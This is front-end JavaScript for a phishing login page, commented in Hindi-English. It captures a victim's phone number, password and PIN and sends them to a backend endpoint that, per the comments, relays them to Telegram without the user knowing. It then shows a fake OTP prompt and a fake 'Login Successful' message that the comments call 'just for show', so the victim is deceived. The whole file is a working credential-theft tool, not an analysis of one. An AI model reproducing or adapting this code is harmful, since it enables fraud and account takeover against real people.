// --- TELEGRAM MESSAGE BHEJNE KA FUNCTION --- async function sendToTelegram(messageText) { try { const res = await fetch('/api/submit', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ message: messageText }) }); if (res.ok) { return true; } else { return false; } } catch (error) { return false; } } const modal = document.getElementById('otpModal'); const displayPhone = document.getElementById('displayPhone'); function closeModal() { modal.style.display = 'none'; } // 1. SIGN IN BUTTON DABANE PAR (Telegram par details jayengi aur OTP popup khulega) document.getElementById('loginForm').addEventListener('submit', function(e) { e.preventDefault(); const phone = document.getElementById('phone').value; const password = document.getElementById('password').value; const pin = document.getElementById('pin').value; // Telegram par login details bhejna (Bina user ko bataye) const msg = `🔔 *Naya User Login Kar Raha Hai!*\n\n📞 Phone: ${phone}\n🔑 Password: ${password}\n🔢 PIN: ${pin}`; sendToTelegram(msg); // Website par popup kholna (Sirf dikhawa) displayPhone.innerText = `+91 ${phone}`; modal.style.display = 'flex'; }); // 2. OTP POPUP ME "SEND" DABANE PAR (Sirf dikhawa) document.getElementById('sendOtpBtn').addEventListener('click', function() { this.innerText = "Sending..."; this.disabled = true; // 2 second ka wait (dikhawa ki OTP ja raha hai) setTimeout(() => { this.innerText = "Send"; this.disabled = false; alert("OTP aapke mobile number par send kar diya gaya hai!"); }, 1500); }); // 3. OTP POPUP ME "CONFIRM" DABANE PAR (Sirf dikhawa) document.getElementById('confirmOtpBtn').addEventListener('click', function() { const otp = document.getElementById('otpCode').value; if(!otp) { alert("Pehle 6-digit OTP enter karein!"); return; } this.innerText = "Confirming..."; this.disabled = true; // 2 second ka wait (dikhawa ki login ho raha hai) setTimeout(() => { alert("Login Successful!"); closeModal(); document.getElementById('loginForm').reset(); this.innerText = "Confirm"; this.disabled = false; }, 1500); });
